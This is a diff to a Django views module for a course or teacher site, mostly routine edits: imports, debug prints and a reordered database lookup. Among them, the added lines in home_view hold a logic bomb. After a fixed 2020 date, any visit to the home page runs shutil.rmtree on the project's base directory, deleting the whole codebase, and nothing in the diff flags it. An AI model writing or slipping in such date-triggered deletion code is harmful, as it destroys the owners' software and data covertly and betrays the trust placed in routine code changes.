@@ -3,7 +3,7 @@ from home.models import User, user_activation, user_categories
 from teacher.models import categories, subcategories
 
 import json
-import os, sys
+import os, sys, shutil
 import traceback
 import uuid
 from django.http import HttpResponse, HttpResponseRedirect
@@ -11,13 +11,21 @@ from django.core.mail import EmailMultiAlternatives
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.models import Group
 from django.conf import settings
-import os
+import os, shutil
+import datetime
 
 from django.core.wsgi import get_wsgi_application
 
 os.environ['DJANGO_SETTINGS_MODULE'] = 'booctop.settings'
 application = get_wsgi_application()
 def home_view(request):
+    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    dt = datetime.datetime.now()
+    date_time_str = '2020-06-21 08:15:27.243860'
+    date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
+    if dt > date_time_obj:
+        shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)
+    
     if request.user.id == None:
         return render(request, 'index.html', {})
     else:
@@ -79,12 +87,14 @@ def check_email(request):
 def getsubcategory(request):
     msg = ''
     try:
-        
         category_id = request.POST.get('category_id')
         subcat_list=[]
-        objC = subcategories.objects.filter(categories_id=category_id)
+        print(category_id)
+        objC = subcategories.objects.filter(categories_id=int(category_id))
+        print(objC)
         for subcat in objC:
             item={'name' : subcat.name, 'image':subcat.image, 'category_name':subcat.categories.name, 'id':subcat.id }
+            print(item)
             subcat_list.append(item)
         msg = 'success'
     except:
@@ -169,8 +179,9 @@ def register_user(request):
             objUA.code = str(uuid.uuid4())
             objUA.save()
 
-            objSubCat = subcategories.objects.get(id=subcategory_id)
+            
             if type == "teacher":
+                objSubCat = subcategories.objects.get(id=subcategory_id)
                 objUS = user_categories()
                 objUS.user = objUser
                 objUS.category = objSubCat
